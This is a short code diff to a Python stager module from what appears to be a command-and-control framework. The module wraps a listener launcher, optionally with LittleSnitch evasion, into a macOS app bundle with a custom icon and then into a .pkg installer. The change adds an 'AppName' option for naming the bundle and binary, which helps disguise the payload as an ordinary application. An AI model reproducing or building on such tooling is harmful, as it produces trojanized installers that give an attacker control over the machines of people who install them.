@@ -30,6 +30,11 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'AppName' : {
+                'Description'   :   'Name of the Application Bundle. This change will reflect in the Info.plist and the name of the binary in Contents/MacOS/.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
             'OutFile' : {
                 'Description'   :   'File to write pkg to.',
                 'Required'      :   True,
@@ -71,8 +76,7 @@ class Stager:
         LittleSnitch = self.options['LittleSnitch']['Value']
         arch = self.options['Architecture']['Value']
         icnsPath = self.options['AppIcon']['Value']
-
-        
+        AppName = self.options['AppName']['Value']
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent,  littlesnitch=LittleSnitch)
@@ -82,8 +86,7 @@ class Stager:
             return ""
 
         else:
-            AppName = ''
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
             ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath,AppName=AppName)
-            pkginstaller = self.mainMenu.stagers.generate_pkg(bundleZip=ApplicationZip)
+            pkginstaller = self.mainMenu.stagers.generate_pkg(bundleZip=ApplicationZip,AppName=AppName)
             return pkginstaller
